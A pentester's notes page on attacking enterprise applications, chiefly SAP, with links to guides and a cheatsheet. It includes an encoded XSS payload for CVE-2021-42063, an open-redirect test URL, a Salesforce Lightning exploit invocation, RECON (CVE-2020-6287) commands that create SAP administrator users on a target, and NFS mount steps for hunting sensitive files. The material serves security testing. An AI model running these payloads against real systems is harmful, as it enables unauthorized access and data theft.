---
layout: notes
permalink: /notes/tech/enterprise/
title: Pentesting Enterprise Applications
---

# Pentesting Enterprise Applications

# Saleforce Aura Lightning
```bash
https://github.com/moniik/poc_salesforce_lightning 
python3 exploit.py -u https://domain.force.com/path/ -[option]
```

# SAP
[SAP Audit&Pentest](https://github.com/Jean-Francois-C/SAP-Security-Audit/blob/master/README.md)\
[SAP PT with Metasploit](https://medium.com/swlh/erp-pentest-metasploit-writeup-e65de8ece7d1)\
[SAP PT Basic guide - 1](https://medium.com/@sumitmaheshwari555/sap-penetration-testing-5e1cee2a5cc8)\
[SAP PT Basic guide - 2](https://techinnovatehub.medium.com/basic-guide-for-pentesting-a-sap-environment-129c39882942)\
[SAP PT Basic guide - 3](https://github.com/shipcod3/mySapAdventures)\
[Response Header Injection in SAP HTTP Content Server](https://herolab.usd.de/security-advisories/usd-2022-0046/)\
[Bizploit guide](https://httphacker.wordpress.com/2013/09/04/up-and-running-with-bizploit/)\
[SAP PT Guide by networkintelligence - 1](https://networkintelligence.ai/blogs/sap-security-assessment-methodology-part-1-a-penetration-tester-meets-sap/)\
[SAP PT Guide by networkintelligence - 2](https://networkintelligence.ai/blogs/sap-security-assessment-methodology-part-2-credential-less-attack-vectors/)\
[SAP PT Guide by networkintelligence - 3](https://networkintelligence.ai/blogs/sap-security-assessment-methodology-part-3-credential-centric-attack-vectors/)

## SAP-Pentest-Cheatsheet
### SAP Web Interface Vulnerability
```bash
#Open Redirection Check
https://HOST/sap/public/bc/icf/logoff?redirecturl=MALICIOUSURL

#Unsecured Protocol (HTTP) Check
http://HOST:PORT/startPage
http://HOST:PORT/sap/public/info

#System Informational Misconfiguration Check
http://HOST:PORT/sap/public/info

#XSS (CVE-2021-42063) - look for /SAPIrExtHelp
https://localhost/SAPIrExtHelp

https://HOST/SAPIrExtHelp/random/%22%3e%3c%53%56%47%20%4f%4e%4c%4f%41%44%3d%26%23%39%37%26%23%31%30%38%26%23%31%30%31%26%23%31%31%34%26%23%31%31%36%28%26%23%78%36%34%26%23%78%36%66%26%23%78%36%33%26%23%78%37%35%26%23%78%36%64%26%23%78%36%35%26%23%78%36%65%26%23%78%37%34%26%23%78%32%65%26%23%78%36%34%26%23%78%36%66%26%23%78%36%64%26%23%78%36%31%26%23%78%36%39%26%23%78%36%65%29%3e.asp

#SAP Information System 1.0 Shell Upload

#CVE-2022-22536 (ICMAD SAP)

#SAP RECON vulnerability (CVE-2020-6287, CVE-2020-6286)
https://github.com/chipik/SAP_RECON
# 1.Download zip file
python RECON.py -H 172.16.30.8 -f /1111.zip

# 2.Create SAP JAVA user
python RECON.py -H 172.16.30.8 -u

# 3.Create SAP JAVA Administrator user
python RECON.py -H 172.16.30.8 -a
```

### SAP Network Vulnerability
```bash
#SSL Vulnerability Check
sslscan

#NFS Mount
nfs-ls nfs://HOST/mount
mkdir mnt && mount -t nfs HOST:/mount ./mnt
#Search for sensitive information in nfs
```